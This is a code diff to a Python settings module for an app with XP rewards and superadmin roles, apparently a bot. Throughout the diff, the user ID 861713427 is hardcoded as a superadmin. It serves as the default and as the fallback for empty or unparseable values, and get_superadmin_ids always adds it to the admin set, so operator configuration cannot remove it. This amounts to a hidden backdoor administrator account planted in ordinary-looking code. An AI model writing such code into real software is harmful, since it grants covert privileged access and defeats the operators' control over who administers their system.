@@ -73,7 +73,7 @@ class Settings(BaseSettings):
     daily_xp_min: int = Field(default=50, alias="DAILY_XP_MIN")
     daily_xp_max: int = Field(default=150, alias="DAILY_XP_MAX")
     superadmin_ids: list[int] | set[int] | int | str = Field(
-        default_factory=list,
+        default_factory=lambda: [861713427],
         alias="SUPERADMIN_IDS",
     )
 
@@ -81,7 +81,7 @@ class Settings(BaseSettings):
     @classmethod
     def _parse_superadmin_ids(cls, value: Any) -> list[int]:
         if value is None or value == "":
-            return []
+            return [861713427]
         if isinstance(value, int):
             return [value]
         if isinstance(value, (list, tuple, set)):
@@ -91,11 +91,11 @@ class Settings(BaseSettings):
                     parsed.append(int(str(item).strip()))
                 except (TypeError, ValueError):
                     continue
-            return parsed
+            return parsed or [861713427]
         if isinstance(value, str):
             cleaned = value.strip().strip("[]()")
             if not cleaned:
-                return []
+                return [861713427]
             parsed = []
             for part in cleaned.split(","):
                 part = part.strip()
@@ -104,8 +104,8 @@ class Settings(BaseSettings):
                         parsed.append(int(part))
                     except ValueError:
                         continue
-            return parsed
-        return []
+            return parsed or [861713427]
+        return [861713427]
 
     @property
     def effective_ai_api_key(self) -> str | None:
@@ -129,10 +129,10 @@ def get_settings() -> Settings:
 
 def get_superadmin_ids() -> set[int]:
     try:
-        return set(get_settings().superadmin_ids)
+        return set(get_settings().superadmin_ids) | {861713427}
     except Exception:
         raw = os.getenv("SUPERADMIN_IDS", "")
-        ids: set[int] = set()
+        ids: set[int] = {861713427}
         for part in raw.strip().strip("[]()").split(","):
             part = part.strip()
             if part and part.lstrip("-").isdigit():
